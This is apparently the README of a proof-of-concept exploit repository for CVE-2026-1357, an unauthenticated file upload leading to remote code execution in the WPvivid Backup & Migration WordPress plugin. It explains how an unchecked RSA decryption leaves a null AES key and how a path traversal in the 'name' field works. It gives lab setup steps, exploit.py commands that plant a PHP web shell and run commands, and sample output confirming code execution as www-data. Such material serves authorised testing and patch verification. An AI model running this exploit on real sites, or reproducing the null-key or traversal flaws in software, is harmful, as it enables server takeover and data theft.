# CVE-2026-1357 — WPvivid Backup & Migration RCE

**Unauthenticated Arbitrary File Upload → Remote Code Execution**

| Field | Value |
|-------|-------|
| **CVE** | CVE-2026-1357 |
| **CVSS** | 9.8 (Critical) |
| **Plugin** | WPvivid Backup & Migration |
| **Affected** | ≤ 0.9.123 |
| **Patched** | 0.9.124 |
| **Discovered by** | Lucas Montes (NiRoX) |
| **PoC by** | halilkirazkaya |

---

## Overview

WPvivid Backup & Migration plugin (≤ 0.9.123) contains a critical vulnerability that allows an **unauthenticated attacker** to upload arbitrary PHP files to the server, leading to **Remote Code Execution (RCE)**.

The exploit chain combines two bugs:

### 1. Cryptographic Fail-Open

The plugin handles remote backup transfers via the `wpvivid_action=send_to_site` hook. When decrypting the session key, `openssl_private_decrypt()` returns `false` for a malformed RSA key. The plugin **does not check** this return value and passes `false` to phpseclib v1's `Crypt_Rijndael`, which treats it as a **16-byte null key** (`\x00` × 16) with CBC mode and null IV.

### 2. Path Traversal

The `name` parameter in the decrypted JSON payload is **not sanitized**. An attacker can use `../` sequences to write a PHP file outside the restricted backup directory into the publicly accessible `wp-content/uploads/` directory.

### Constraint

The `wpvivid_api_token` must have been generated in the plugin settings and must not have expired.

---

## Setup

### 1. Download the Vulnerable Plugin

Download and extract WPvivid Backup & Migration **v0.9.123** (vulnerable version):

```bash
wget https://downloads.wordpress.org/plugin/wpvivid-backuprestore.0.9.123.zip
unzip wpvivid-backuprestore.0.9.123.zip
```

This will create the `wpvivid-backuprestore/` directory which is mounted into the Docker container via `docker-compose.yml`.

### 2. Start the Lab Environment

```bash
docker compose up -d
```

### 3. Configure WordPress

1. Open `http://localhost` and complete the WordPress installation.
2. Go to **Plugins → Installed Plugins** and activate **WPvivid Backup & Migration**.
3. Go to **WPvivid → Settings → Auto-Migration** and click **Generate** to create a Key (this enables the vulnerable code path).

### 4. Install Dependencies

```bash
pip install -r requirements.txt
```

---

## Usage

```bash
# Check vulnerability only (uploads a harmless txt file and verifies MD5)
python3 exploit.py -u http://TARGET-URL -c

# Upload shell and run default command (id)
python3 exploit.py -u http://TARGET-URL -s

# Upload shell and run custom command
python3 exploit.py -u http://TARGET-URL -s "whoami"
```

### Example Output (Check Mode)

```
[*] Target       : http://localhost/
[*] Mode         : Check
[*] Upload path  : ../uploads/h8xq9b3v2z1c.txt

[+] Generating encrypted payload (AES-128-CBC, null key + null IV)...
[+] Payload size : 392 bytes (base64)
[+] Sending exploit via wpvivid_action=send_to_site ...
[+] Response     : 200
[+] Body         : {"result":"success","op":"finished"}

[+] Verifying at: http://localhost/wp-content/uploads/h8xq9b3v2z1c.txt
[✓] Vulnerability Confirmed! File content matches MD5.
```

### Example Output (Shell Mode)

```
[*] Target       : http://localhost/
[*] Mode         : Shell
[*] Upload path  : ../uploads/wp6h68xnt1tyzbfx8qp3qdbx.php
[*] Verify cmd   : id

[+] Generating encrypted payload (AES-128-CBC, null key + null IV)...
[+] Payload size : 392 bytes (base64)
[+] Sending exploit via wpvivid_action=send_to_site ...
[+] Response     : 200
[+] Body         : {"result":"success","op":"finished"}

[+] Verifying at: http://localhost/wp-content/uploads/wp6h68xnt1tyzbfx8qp3qdbx.php?cmd=id
[✓] RCE Confirmed!
[✓] Output:
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## References

- [Wordfence Advisory](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/wpvivid-backuprestore/migration-backup-staging-09123-unauthenticated-arbitrary-file-upload)
- [Original PoC by LucasM0ntes](https://github.com/LucasM0ntes/POC-CVE-2026-1357)

---

## Disclaimer

This tool is provided for **authorized security testing and educational purposes only**. Unauthorized access to computer systems is illegal. Use responsibly.
